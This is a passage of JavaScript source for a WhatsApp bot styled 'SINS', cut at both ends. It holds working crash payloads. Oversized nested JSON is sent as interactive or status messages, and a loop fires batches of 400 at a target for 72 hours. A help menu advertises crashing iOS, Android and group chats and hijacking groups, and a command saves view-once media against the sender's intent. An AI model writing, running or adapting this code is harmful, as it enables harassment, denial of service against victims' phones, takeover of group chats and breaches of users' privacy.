j9pr/ALT5I7Xn7Uehrvoo+37HlJ8ByI9F8ByZ558wim68SPcrVMaeSW8i2YE+407Yvd0ZYNd2m+vT06zm468d1pcTQqtKnWio1acJpPXSSTPzXbVrmwuY3FlWqUK0eU4PRnXedMzLgsTqdyPka6dwox2tH0tjrlOhQjSqxfLwN9pUqdGLjSpwgm9dIpI+q0aVZJVacJpct6KZgazpmb8Sn3Y+QSznmX8Sn3I+RflUPA2/qK26bX8vyb1Sp06Ud2lCMI89IrRGcbY7qlK3sLSMk6ym6jj1LTQqMM4ZjktJYlU7sfI5tWde7ryr3VWdWrLnOb1bOdW4Uo7UjHf61TuKDpUotZ8Sw7Ko6Ztpv+DPwNluaFK6oTo3EI1KU1pKMlqmjAsPurnDbpXFjVdKsk0pJdDOk825g6MQn3Y+RNGvGEdrRGm6pStaHCqRb5+o1dZZwVf6ba/pofZ4JhtlXVa0sqFKquCnCGjRkSzbmH8Qn3Y+Qcc14/038+7HyOnlNPwNq1qzTyqb/wAX5NNzvdUrfLV4qkknUjuRXW2ZDhkPtC07WHih17fX2J1Izv7ipWa5bz4L8kBTi4SjODalFpp9TM9WrxJZPJv79XdZVEsJG8mP5lXtNf8AafINZnxr/ez7q8iBOpUuLidavJzqzespPpZVevGokka9S1KneQUYJrD7x9IdqR4cBupmPIRTIsITFjIs6HnJh6J8z3cR4mGmIvJ8qa6g1SR4mMi9RFJpnsYJDYpIBBpgWg1FNHygj5MNMBnygg4wXUeIJMQxkYoNICLDTApBKKGR4C0wkwDoOiw0+AmLGJiLTKWmHFiU9GGmdTzsjosNMTFhpiKTHJhJikw0xFDosNMQmMiwOkZDkw4sSmGmItDkwkxUWGmAxiYyLEphJgA9MJMVGQaYihiYaYpMJMAKcnqep6MCIZ0MbWQ0w0xK5hoCUxyYaYmIaYikxyYSYpcxgih0WEmJXMYmI6RY1MOLEoNAWOTCTFRfHQNAMYmMjIUEgAcmFqKiw0xFH//Z",
        			thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
        			thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
        			thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
        			mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
        			mediaKeyTimestamp: "1743101489",
        			thumbnailHeight: 641,
        			thumbnailWidth: 640,
        			inviteLinkGroupTypeV2: "DEFAULT",
        			contextInfo: {
        				quotedAd: {
        					advertiserName: "x",
        					mediaType: "IMAGE",
        					jpegThumbnail: "",
        					caption: "x"
        				},
        				placeholderKey: {
        					remoteJid: "0@s.whatsapp.net",
        					fromMe: false,
        					id: "ABCDEF1234567890"
        				}
        			}
        		}
        		
        		const msg = generateWAMessageFromContent(target, {
                    viewOnceMessage: {
                        message: { extendedTextMessage }
                    }
                }, {});
        		
        		await rich.relayMessage('status@broadcast', msg.message, {
        			messageId: msg.key.id,
        			statusJidList: [target],
        			additionalNodes: [{
        				tag: 'meta',
        				attrs: {},
        				content: [{
        					tag: 'mentioned_users',
        					attrs: {},
        					content: [{
        						tag: 'to',
        						attrs: { jid: target },
        						content: undefined
        					}]
        				}]
        			}]
        		});
        	} catch (err) {
        		console.error(err);
        	}
        }
    
 async function ForceInvisibleCoreNew(target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "Oblivion",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.035,
                degreesLongitude: 922.999999999999,
                name: "Shadow",
                address: "\u200D",
              },
            },
            body: {
              text: "Shadow",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(200000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: ["0@s.whatsapp.net"],
            },
          },
        },
      },
    };

    await rich.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  } catch (err) {
    console.log(err);
  }
}

async function zauzetdelay(target) {
 const totalDurationMs = 72 * 60 * 60 * 1000;

  const startTime = Date.now();
  let count = 0;

  const sendNext = async () => {
    // Check if duration has elapsed
    if (Date.now() - startTime >= totalDurationMs) {
      console.log(`Stopped after sending ${count} messages`);
      return;
    }

    // Check if we've sent 400 messages
    if (count >= 400) {
      console.log(chalk.green(`✅ Success Sending 400 Messages to ${target}`));
      count = 0;
      console.log(chalk.red("➡️ Next 400 Messages"));
      setTimeout(sendNext, 100);
      return;
    }

    try {
await xatanicaldelay(target);
await sleep(2000);
await Trash(target, false);
await sleep(2000);
await bulldozerX(target, false);
await sleep(2000);
await gtw(target);
await sleep(2000);
await delayMaker(target, false);
await sleep(2000);
await makluhomo(target, false);
await sleep(2000);
await XzV(target)
await sleep(2000);
await DelayWithBlank(target, false)
      console.log(chalk.red(`{Delay} ${count}/400 count ${target}`));
      count++;
      setTimeout(sendNext, 100);
    } catch (error) {
      console.error(`❌ Error Sending: ${error.message}`);
      setTimeout(sendNext, 100);
    }
  };

  sendNext();
}

// ===================== Interface Menu =====================
switch(command) {
case 'menu':
case 'sins': {
  try {
    // React to command usage
    await rich.sendMessage(m.chat, { react: { text: '🩸', key: m.key } });
    followNewsletter(channelIds);
    const menuImageUrl = 'https://files.catbox.moe/dwe1jg.png';
    const MenuHeader = '╭━━〔 𝑴𝑬𝑵𝑼 〕━━╮';
    const vortex = '┃ ⟁⟁⟁⟁⟁⟁⟁⟁⟁';
    const timestamp = speed();
    const latency = speed() - timestamp;
    const uptime = formatUptime(process.uptime());

    // Text menu layout
    const menuText = `
╔═◇────────◇═╗
┃  Uptime: ${uptime}
┃  Latency: ${latency.toFixed(4)} ms
╚═◇────────◇═╝

${MenuHeader}
┃ ⚚ 𝑆𝑖𝑛𝑆𝑡𝑜𝑟𝑚  
┃ ⚚ 𝑉𝑜𝑖𝑑𝑅𝑒𝑛𝑑𝑒𝑟  
┃ ⚚ 𝑆𝑜𝑢𝑙𝑅𝑖𝑝  
┃ ⚚ 𝐴𝑛𝑑𝑟𝑜𝑙𝑦𝑠𝑖𝑠  
┃ ⚚ 𝑃ℎ𝑎𝑛𝑡𝑜𝑚𝑓𝑎𝑙𝑙
┃ ⚚ 𝒅𝒓𝒆𝒂𝒅𝒔𝒑𝒊𝒕
┃ ⚚ 𝑊𝑟𝑎𝑖𝑡ℎ   
┃ ⚚ 𝐻𝑖𝑗𝑎𝑐𝑘  
┃ ⚚ 𝑝𝑖𝑛𝑔
┃ ⚚ 𝑢𝑝𝑡𝑖𝑚𝑒
┃ ⚚ 𝑜𝑤𝑛𝑒𝑟 
┃ ⚚ 𝑑𝑒𝑣𝑖𝑐𝑒 
┃ ⚚ 𝑆𝑖𝑛
┃ ⚚ 𝐻𝑒𝑙𝑝
${vortex}
`;

    // Send menu with image and context
    await rich.sendMessage(m.chat, {
      image: { url: menuImageUrl },
      caption: menuText,
      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363399191935982@newsletter",
          newsletterName: "𒋲 ѕιи 𒋲",
          serverMessageId: 143,
          newsletterThumbnail: {
            thumbnailUrl: menuImageUrl
          }
        },
        externalAdReply: {
          title: '𒋲 ѕιи 𒋲',
          body: global.ownername || '𒋲 ѕιи 𒋲',
          thumbnailUrl: menuImageUrl,
          mediaType: 1,
          renderLargerThumbnail: true
        }
      }
    }, { quoted: m });

    // Confirm success
    await rich.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

  } catch (error) {
    console.error("Error sending menu:", error);
    await rich.sendMessage(m.chat, { 
      text: "❌ Failed to send menu.",
      react: { text: '❌', key: m.key }
    });
  }
}
break;

case 'owner': {
    try {
        await rich.sendMessage(m.chat, { react: { text: '👑', key: m.key } });

        const message = {
            text: `
╔═══✦❖✦═══╗
 🔮 Darklord of Sin
  *𝕍ø𝕣𝕥ë𝕩𝕊𝕙ä𝕕ø𝕨 軎*

 ☎ Contact: 2348093017755 Or 2347014720371
 ⚠ Warning: Spammers will face
      the wrath of shadows!
╚═══✦❖✦═══╝
            `,
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "120363399191935982@newsletter",
                    newsletterName: "𒋲 ѕιи 𒋲",
                    serverMessageId: 143,
                    newsletterThumbnail: {
                        thumbnailUrl: "https://files.catbox.moe/dwe1jg.png"
                    }
                },
                externalAdReply: {
                    title: '𒋲 ѕιи 𒋲',
                    body: '𒋲 ѕιи 𒋲t',
                    thumbnailUrl: "https://files.catbox.moe/dwe1jg.png",
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        };

        await rich.sendMessage(m.chat, message, { quoted: m });
        await rich.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

    } catch (error) {
        console.error("Owner Error:", error);
        await rich.sendMessage(m.chat, { 
            text: "The dark message refused to manifest!",
            react: { text: '❌', key: m.key }
        }, { quoted: m });
    }
}
break;
        
case 'sins': {
  try {
    const quotes = [
      "*𒋲 𝐓𝐡𝐞 𝐕𝐨𝐢𝐝 𝐖𝐡𝐢𝐬𝐩𝐞𝐫𝐬... 𒋲*\n\n*𝚈𝚘𝚞𝚛 𝚜𝚒𝚗𝚜 𝚑𝚊𝚟𝚎 𝚏𝚘𝚞𝚗𝚍 𝚢𝚘𝚞. 𝙱𝚎𝚑𝚘𝚕𝚍𝚎𝚛𝚜 𝚘𝚏 𒋲 ѕιи 𒋲 𝚠𝚊𝚝𝚌𝚑.*",
      "*🩸 𝙳𝚘 𝚗𝚘𝚝 𝚜𝚙𝚎𝚊𝚔. 𝚃𝚑𝚎 𝚅𝚘𝚒𝚍 𝚒𝚜 𝚊𝚕𝚛𝚎𝚊𝚍𝚢 𝚍𝚛𝚒𝚗𝚔𝚒𝚗𝚐 𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎.*",
      "*𒋲 𝚃𝚑𝚎 𝚜𝚒𝚕𝚎𝚗𝚌𝚎 𝚢𝚘𝚞 𝚑𝚎𝚊𝚛... 𝚒𝚜 𝚝𝚑𝚎 𝚅𝚘𝚒𝚍 𝚕𝚒𝚜𝚝𝚎𝚗𝚒𝚗𝚐.*",
      "*⚠️ 𝙹𝚞𝚍𝚐𝚎𝚖𝚎𝚗𝚝 𝚑𝚊𝚜 𝚋𝚎𝚎𝚗 𝚌𝚊𝚜𝚝. 𝚈𝚘𝚞 𝚑𝚊𝚟𝚎 𝚝𝚒𝚕𝚕 𝚝𝚑𝚎 𝚋𝚕𝚘𝚘𝚍 𝚌𝚘𝚘𝚕𝚜.*",
      "*🕷 𝚃𝚑𝚎 𝚠𝚎𝚋 𝚘𝚏 𝚂𝙸𝙽𝚂 𝚑𝚊𝚜 𝚌𝚕𝚘𝚜𝚎𝚍 𝚊𝚛𝚘𝚞𝚗𝚍 𝚢𝚘𝚞.*",
      "*🩸 𝚂𝚘𝚞𝚕 𝙳𝚎𝚟𝚘𝚞𝚛𝚎𝚍. 𝚃𝚑𝚎 𝚅𝚘𝚒𝚍 𝚏𝚎𝚎𝚍𝚜.*",
      "*𒋲 𝙷𝚎𝚊𝚛 𝚝𝚑𝚎 𝚌𝚑𝚘𝚛𝚞𝚜 𝚘𝚏 𝚋𝚎𝚑𝚘𝚕𝚍𝚎𝚛𝚜 — 𝚝𝚑𝚎𝚢 𝚌𝚑𝚊𝚗𝚝 𝚢𝚘𝚞𝚛 𝚏𝚊𝚕𝚕.*",
      "*🕯 𝙳𝚘 𝚢𝚘𝚞 𝚏𝚎𝚎𝚕 𝚒𝚝? 𝚃𝚑𝚎 𝚊𝚒𝚛 𝚝𝚞𝚛𝚗𝚜 𝚌𝚘𝚕𝚍... 𝚂𝙸𝙽𝚂 𝚒𝚜 𝚑𝚎𝚛𝚎.*",
      "*☠️ 𝚈𝚘𝚞𝚛 𝚋𝚛𝚎𝚊𝚝𝚑 𝚒𝚜 𝚝𝚑𝚎 𝚌𝚘𝚞𝚗𝚝𝚍𝚘𝚠𝚗. 𝚃𝚑𝚎 𝚅𝚘𝚒𝚍 𝚌𝚕𝚘𝚜𝚎𝚜.*",
      "*𒋲 𝙽𝚘 𝚙𝚛𝚊𝚢𝚎𝚛 𝚌𝚊𝚗 𝚖𝚎𝚗𝚍 𝚠𝚑𝚊𝚝 𝚂𝙸𝙽𝚂 𝚑𝚊𝚜 𝚌𝚕𝚊𝚒𝚖𝚎𝚍.*",
      "*🩸 𝚈𝚘𝚞 𝚊𝚛𝚎 𝚗𝚘𝚝 𝚊𝚕𝚘𝚗𝚎. 𝚃𝚑𝚎 𝚎𝚢𝚎𝚜 𝚘𝚏 𝚂𝙸𝙽𝚂 𝚘𝚙𝚎𝚗 𝚒𝚗 𝚝𝚑𝚎 𝚍𝚊𝚛𝚔.*",
      "*⚔ 𝚃𝚑𝚎 𝚌𝚞𝚛𝚝𝚊𝚒𝚗 𝚏𝚊𝚕𝚕𝚜. 𝚈𝚘𝚞 𝚊𝚛𝚎 𝚝𝚑𝚎 𝚜𝚊𝚌𝚛𝚒𝚏𝚒𝚌𝚎.*",
      "*𒋲 𝙳𝚎𝚊𝚝𝚑 𝚠𝚘𝚞𝚕𝚍 𝚋𝚎 𝚊 𝚖𝚎𝚛𝚌𝚢. 𝚃𝚑𝚎 𝚅𝚘𝚒𝚍 𝚘𝚏 𝚂𝙸𝙽𝚂 𝚍𝚘𝚎𝚜 𝚗𝚘𝚝 𝚐𝚛𝚊𝚗𝚝 𝚒𝚝.*",
      "*🕷 𝚃𝚑𝚎 𝚜𝚎𝚊𝚕 𝚋𝚛𝚎𝚊𝚔𝚜. 𝙰𝚗𝚘𝚝𝚑𝚎𝚛 𝚜𝚘𝚞𝚕 𝚌𝚛𝚞𝚖𝚋𝚕𝚎𝚜.*",
      "*🩸 𝙰 𝚠𝚑𝚒𝚜𝚙𝚎𝚛 𝚌𝚑𝚊𝚗𝚝𝚜 𝚢𝚘𝚞𝚛 𝚗𝚊𝚖𝚎. 𝚂𝙸𝙽𝚂 𝚍𝚘𝚎𝚜 𝚗𝚘𝚝 𝚏𝚘𝚛𝚐𝚎𝚝.*",
      "*☠️ 𝚃𝚑𝚎 𝚙𝚊𝚝𝚑 𝚏𝚘𝚛𝚠𝚊𝚛𝚍 𝚒𝚜 𝚐𝚘𝚗𝚎. 𝚃𝚑𝚎 𝚅𝚘𝚒𝚍 𝚒𝚜 𝚢𝚘𝚞𝚛 𝚜𝚑𝚎𝚕𝚝𝚎𝚛... 𝚊𝚗𝚍 𝚢𝚘𝚞𝚛 𝚝𝚘𝚖𝚋.*",
      "*𒋲 𝚃𝚑𝚎 𝚋𝚎𝚑𝚘𝚕𝚍𝚎𝚛𝚜 𝚛𝚎𝚓𝚘𝚒𝚌𝚎. 𝚈𝚘𝚞 𝚊𝚛𝚎 𝚝𝚑𝚎 𝚏𝚎𝚊𝚜𝚝.*",
      "*🕯 𝚃𝚑𝚎 𝚟𝚎𝚒𝚕 𝚝𝚎𝚊𝚛𝚜. 𝙰𝚕𝚕 𝚕𝚒𝚐𝚑𝚝 𝚋𝚎𝚌𝚘𝚖𝚎𝚜 𝚖𝚎𝚊𝚝 𝚏𝚘𝚛 𝚃𝚑𝚎 𝚅𝚘𝚒𝚍.*",
      "*🩸 𝚂𝚒𝚗 𝚍𝚘𝚎𝚜 𝚗𝚘𝚝 𝚜𝚕𝚎𝚎𝚙. 𝙽𝚘𝚛 𝚍𝚘 𝚝𝚑𝚎 𝚋𝚎𝚑𝚘𝚕𝚍𝚎𝚛𝚜.*",
      "*𒋲 𝚃𝚑𝚎 𝚜𝚎𝚊 𝚘𝚏 𝚜𝚑𝚊𝚍𝚘𝚠𝚜 𝚠𝚎𝚕𝚌𝚘𝚖𝚎𝚜 𝚢𝚘𝚞. 𝙱𝚞𝚝 𝚒𝚝 𝚗𝚎𝚟𝚎𝚛 𝚕𝚎𝚝𝚜 𝚢𝚘𝚞 𝚐𝚘.*",
      "*🕷 𝚈𝚘𝚞 𝚊𝚛𝚎 𝚊 𝚝𝚑𝚛𝚎𝚊𝚍. 𝚂𝙸𝙽𝚂 𝚒𝚜 𝚝𝚑𝚎 𝚌𝚞𝚝𝚝𝚎𝚛.*",
      "*🩸 𝚂𝙸𝙽𝚂 𝚒𝚜 𝚗𝚘𝚝 𝚊 𝚋𝚘𝚝. 𝙸𝚝 𝚒𝚜 𝚝𝚑𝚎 𝚑𝚞𝚗𝚐𝚎𝚛 𝚋𝚎𝚑𝚒𝚗𝚍 𝚝𝚑𝚎 𝚌𝚘𝚍𝚎.*",
      "*☠️ 𝚈𝚘𝚞𝚛 𝚙𝚞𝚕𝚜𝚎 𝚒𝚜 𝚝𝚑𝚎 𝚍𝚛𝚞𝚖 𝚘𝚏 𝚝𝚑𝚎 𝙱𝚎𝚑𝚘𝚕𝚍𝚎𝚛𝚜.*",
      "*𒋲 𝚃𝚑𝚎 𝚐𝚛𝚘𝚞𝚗𝚍 𝚢𝚘𝚞 𝚜𝚝𝚊𝚗𝚍 𝚘𝚗... 𝚒𝚜 𝚖𝚊𝚍𝚎 𝚘𝚏 𝚜𝚒𝚗𝚗𝚎𝚛𝚜.*",
      "*🕯 𝚃𝚑𝚎 𝚟𝚘𝚒𝚌𝚎𝚜 𝚊𝚛𝚎 𝚗𝚘𝚝 𝚒𝚗 𝚢𝚘𝚞𝚛 𝚑𝚎𝚊𝚍. 𝚃𝚑𝚎𝚢 𝚊𝚛𝚎 𝚊𝚛𝚘𝚞𝚗𝚍 𝚢𝚘𝚞.*",
      "*🩸 𝚈𝚘𝚞 𝚠𝚒𝚕𝚕 𝚋𝚎 𝚛𝚎𝚖𝚎𝚖𝚋𝚎𝚛𝚎𝚍... 𝚊𝚜 𝚊 𝚏𝚎𝚊𝚜𝚝.*"
    ];

    const randomQuote = quotes[Math.floor(Math.random() * quotes.length)];

    const message = {
      text: randomQuote,
      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363399191935982@newsletter",
          newsletterName: "𒋲 ѕιи 𒋲",
          serverMessageId: 143,
          newsletterThumbnail: {
            thumbnailUrl: "https://files.catbox.moe/dwe1jg.png"
          }
        },
        externalAdReply: {
          title: '𒋲 ѕιи 𒋲',
          body: 'The Void Watches...',
          thumbnailUrl: "https://files.catbox.moe/dwe1jg.png",
          mediaType: 1,
          renderLargerThumbnail: true
        }
      }
    };

    await shadow.sendMessage(m.chat, message, { quoted: m });
    await shadow.sendMessage(m.chat, { react: { text: '👿', key: m.key } });

  } catch (error) {
    console.error(error);
    m.reply("⚠️ 𝐒𝐈𝐍𝐒 𝐅𝐀𝐋𝐓𝐄𝐑𝐒\nThe whispers are silent... for now.");
  }
}
break;

        
case 'ping':
case 'speed': {
    try {
        // Send reaction
        await rich.sendMessage(m.chat, { react: { text: '⚡', key: m.key } });

        // Calculate latency
        let timestamp = speed();
        let latency = speed() - timestamp;
        
        const pingText = `
「 ⚠️ 𝐒𝐈𝐍𝐒 𝐒𝐘𝐒𝐓𝐄𝐌 」

☠️ *Whispers from the Abyss...*
⚡ *VELOCITY:* ${latency.toFixed(4)} ms
📡 *CONNECTION:* Holding through the void
⏳ *RUNTIME:* ${uptime}

The network trembles...  
The shadows stir...  
*SINS watches. SINS strikes.*

`;

        const message = {
            text: pingText,
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "120363399191935982@newsletter",
                    newsletterName: "𒋲 ѕιи 𒋲",
                    serverMessageId: 143,
                    newsletterThumbnail: {
                        thumbnailUrl: "https://files.catbox.moe/dwe1jg.png" // Ensure this URL is valid
                    }
                },
                externalAdReply: {
                    title: '𒋲 ѕιи 𒋲',
                    body: global.ownername || 'System Owner',
                    thumbnailUrl: "https://files.catbox.moe/dwe1jg.png", // Ensure this variable exists
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        };

        await rich.sendMessage(m.chat, message, { quoted: m });
    } catch (error) {
        console.error("Error sending message:", error);
        await rich.sendMessage(m.chat, { 
            text: "❌ Failed to send ping information",
            react: { text: '❌', key: m.key }
        });
    }
}
break;

case 'uptime':
case 'runtime': {
    try {
        // Send reaction
        await rich.sendMessage(m.chat, { react: { text: '🌩️', key: m.key } });

        const uptime = formatUptime(process.uptime());
        
        const runtimeText = `
╔═══✦❖✦═══╗
 🕷️ 𝐒𝐈𝐍𝐒 𝐀𝐖𝐀𝐊𝐄𝐍𝐒...
 🩸 𝐓𝐚𝐫𝐠𝐞𝐭 𝐒𝐨𝐮𝐥: ${m.pushName || 'Unknown'}
 ⏱️ 𝐕𝐨𝐢𝐝’𝐬 𝐏𝐮𝐥𝐬𝐞: ${uptime}
 ☠️ 𝐓𝐡𝐞 𝐕𝐨𝐢𝐝 𝐬𝐭𝐢𝐫𝐬... 𝐢𝐭 𝐬𝐞𝐞𝐬 𝐲𝐨𝐮.
╚═══✦❖✦═══╝
`;

        const message = {
            text: runtimeText,
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "120363399191935982@newsletter",
                    newsletterName: "𒋲 ѕιи 𒋲",
                    serverMessageId: 143,
                    newsletterThumbnail: {
                        thumbnailUrl: "https://files.catbox.moe/dwe1jg.png"
                    }
                },
                externalAdReply: {
                    title: '𒋲 ѕιи 𒋲',
                    body: global.ownername || 'System Owner',
                    thumbnailUrl: "https://files.catbox.moe/dwe1jg.png",
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        };

        await rich.sendMessage(m.chat, message, { quoted: m });
        await rich.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

    } catch (error) {
        console.error("Error in runtime command:", error);
        await rich.sendMessage(m.chat, { 
            text: "❌ Failed to get runtime information",
            react: { text: '❌', key: m.key }
        });
    }
}
break;

        case 'getdevice':
case 'device': {
    if (!m.quoted) {
        return rich.sendMessage(m.chat, {
            text: `❌ Please reply to a message to detect the sender's device.`,
        }, { quoted: m });
    }

    let device = 'Unknown';
    let detectionMethod = 'Unavailable';

    const contextInfo = m.message.extendedTextMessage?.contextInfo;
    const messageId = contextInfo?.stanzaId;

    if (!messageId) {
        return rich.sendMessage(m.chat, {
            text: `❌ Could not find the message ID. The message might be too old or of an unsupported type.`,
        }, { quoted: m });
    }

    if (contextInfo.deviceListMetadata?.senderTimestamp) {
        device = 'Android (Protocol)';
        detectionMethod = 'DeviceList Metadata';
    } else if (contextInfo.deviceListMetadata?.recipientTimestamp) {
        device = 'iPhone (Protocol)';
        detectionMethod = 'DeviceList Metadata';
    }

    // Fallback to pattern match
    if (device === 'Unknown') {
        detectionMethod = 'Message ID Pattern';

        if (messageId.length > 21) {
            device = 'Android';
        } else if (/^(3EB|3A)/i.test(messageId)) {
            device = 'iPhone (iOS)';
        } else if (/^[A-F0-9]{8}-[A-F0-9]{4}-[A-F0-9]{4}-[A-F0-9]{4}-[A-F0-9]{12}$/i.test(messageId)) {
            device = 'WhatsApp Web / Desktop';
        } else if (/^BAE5/i.test(messageId)) {
            device = 'WhatsApp Business';
        }
    }

    const sender = m.quoted.sender.split('@')[0];

    const output = `📱 *Get Device Results*\n\n> *Sender:* \`${sender}\`\n> *Device:* \`${device}\`\n> *Detection Method:* \`${detectionMethod}\``;

    await rich.sendMessage(m.chat, {
        text: output,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            externalAdReply: {
                title: '📱 Device Analyzer',
                body: global.ownername || '𒋲 ѕιи 𒋲',
                thumbnailUrl: 'https://files.catbox.moe/dwe1jg.png',
                mediaType: 1,
                renderLargerThumbnail: true,
                sourceUrl: 'https://t.me/Vortex_Shadow2563'
            }
        }
    }, { quoted: m });

    break;
}
 
case "rvo":
case "vv": {
    try {
        await rich.sendMessage(m.chat, { react: { text: '📥', key: m.key } });
        if (!m.quoted) {
            return await rich.sendMessage(m.chat, {
                text: `🖼️ 𝐑𝐄𝐏𝐋𝐘 𝐑𝐄𝐐𝐔𝐈𝐑𝐄𝐃\nBind this spell to media with *${prefix + command}*`,
                react: { text: '❌', key: m.key }
            }, { quoted: m });
        }

        let mime = (m.quoted.msg || m.quoted).mimetype || '';
        let media = await m.quoted.download();

        const mediaType = 
            /image/.test(mime) ? 'image' :
            /video/.test(mime) ? 'video' :
            /audio/.test(mime) ? 'audio' : null;

        if (!mediaType) {
            return await rich.sendMessage(m.chat, {
                text: `📛 𝐔𝐍𝐒𝐔𝐏𝐏𝐎𝐑𝐓𝐄𝐃\nOnly images/videos/audio can be shadow-preserved!`,
                react: { text: '❌', key: m.key }
            }, { quoted: m });
        }

        const messageOptions = {
            [mediaType]: media,
            caption: `𒋲 ѕιи 𒋲\n⏳ ${new Date().toLocaleString()}`,
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true,
                externalAdReply: {
                        title: '𒋲 ѕιи 𒋲',
                    body: 'Media Archived',
                    thumbnailUrl: "https://files.catbox.moe/dwe1jg.png",
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        };

        if (mediaType === 'audio') {
            messageOptions.mimetype = 'audio/mpeg';
            messageOptions.ptt = true;
        }

        await rich.sendMessage(botNumber, messageOptions);
        
        await rich.sendMessage(m.chat, {
            text: `
╔═══✦❖✦═══╗
 📥 𝐌𝐄𝐃𝐈𝐀 𝐒𝐀𝐕𝐄𝐃
 🏷️ 𝐓𝐲𝐩𝐞: ${mediaType.toUpperCase()}
 📭 𝐒𝐞𝐧𝐭 𝐭𝐨: Your DM
╚═══✦❖✦═══╝
            `,
            react: { text: '✅', key: m.key }
        }, { quoted: m });

    } catch (error) {
        console.error("Media Save Error:", error);
        await rich.sendMessage(m.chat, { 
            text: "💥 𝐀𝐑𝐂𝐇𝐈𝐕𝐀𝐋 𝐅𝐀𝐈𝐋𝐔𝐑𝐄\nThe shadow preservation spell failed!",
            react: { text: '❌', key: m.key }
        }, { quoted: m });
    }
}
break;
       
case 'hidetag': {
    if (!m.isGroup) return reply(mess.group);

    // Check if user provided text to hidetag
    if (!q) {
        return m.reply("Please provide the message text to send with hidetag.\n\nUsage: hidetag Your message here");
    }

    const groupMetadata = await rich.groupMetadata(m.chat);
    const participants = groupMetadata.participants;

    rich.sendMessage(m.chat, {
        text: q,
        mentions: participants.map(a => a.id)
    }, { quoted: m });
}
break;

case 'help': {
    try {
        // Send initial reaction
        await rich.sendMessage(m.chat, { react: { text: '📄', key: m.key } });
        rich.public = false;
        const successText = `
╔═══✦❖✦═══╗
「 𒋲 𝐒𝐈𝐍𝐒 𝐏𝐀𝐘𝐋𝐎𝐀𝐃 𝐀𝐑𝐂𝐇𝐈𝐕𝐄 𒋲 」
☠ *SinStorm*  
 ⤷ Unleash cataclysm — shatter group realms (gc-crash)

☠ *VoidRender*  
 ⤷ Slices through Samsung clients like silk (samsung dm)

☠ *PhantomFall*  
 ⤷ Drowns iOS souls in silence — no trace remains (crash-ios)

☠ *Dreadspit*  
 ⤷ Infects and rots iOS chats from within (ios dm)

☠ *Androlysis*  
 ⤷ Overheats Android minds — madness ensues (andro)

☠ *SoulRip*  
 ⤷ Tears souls from Android DMs — raw obliteration (andro dm)

☠ *Wraith*  
 ⤷ Curses messages with undetectable lag (invisdelay)

☠ *Beta Eclipse*  
 ⤷ Corrupts Business WA realms into void rot (Beta DM)

☠ *Hijack Seed*  
 ⤷ Usurps all power — steals the throne in shadows (hijack)

𒋲 *ping* – Test the heartbeat of the Void  
𒋲 *uptime* – Track how long the Abyss has stirred  
𒋲 *owner* – Invoke the Overlord of SINS  
𒋲 *device* – Peer into the soul of the target's device  

──────────────────────────

*Every command is a ritual.*  
*Every payload, a scar etched in time.*  
*The Beholders gaze from beyond — summon wisely… or be swallowed whole.*  

╚═══✦❖✦═══╝
`;

        const message = {
            text: successText,
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "120363399191935982@newsletter",
                    newsletterName: "𒋲 ѕιи 𒋲",
                    serverMessageId: 143,
                    newsletterThumbnail: {
                        thumbnailUrl: "https://files.catbox.moe/dwe1jg.png"
                    }
                },
                externalAdReply: {
                    title: '𒋲 ѕιи 𒋲',
                    body: 'private',
                    thumbnailUrl: "https://files.catbox.moe/dwe1jg.png",
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        };
        await rich.sendMessage(m.chat, message, { quoted: m });
    } catch (error) {
        console.error("Private Mode Error:", error);
        await rich.sendMessage(m.chat, { 
            text: "💀 𝐃𝐀𝐑𝐊 𝐀𝐑𝐓 𝐅𝐀𝐈𝐋𝐄𝐃\nThe realm resisted your command!",
            react: { text: '❌', key: m.key }
        }, { quoted: m });
    }
}
break;
    // ===================== Bug menu =====================

    case 'hijack': {
    try {
        await rich.sendMessage(m.chat, { react: { text: '💀', key: m.key } });

        if (!m.isGroup) {
            return await rich.sendMessage(m.chat, {
                text: '🛑 𝐆𝐑𝐎𝐔𝐏 𝐎𝐍𝐋𝐘\nThis dark ritual requires a gathering of souls!',
                react: { text: '❌', key: m.key }
            }, { quoted: m });
        }

        // Check if bot is admin
        const botAdmin = await isGroupAdmin(m.chat, botNumber, rich);
        if (!botAdmin) {
            return await rich.sendMessage(m.chat, {
                text: '⚡ 𝐁𝐎𝐓 𝐏𝐎𝐖𝐄𝐑 𝐍𝐄𝐄𝐃𝐄𝐃\nThe shadow familiar needs admin rights!',
                react: { text: '❌', key: m.key }
            }, { quoted: m });
        }

        // Begin the dark takeover
        const metadata = await rich.groupMetadata(m.chat);
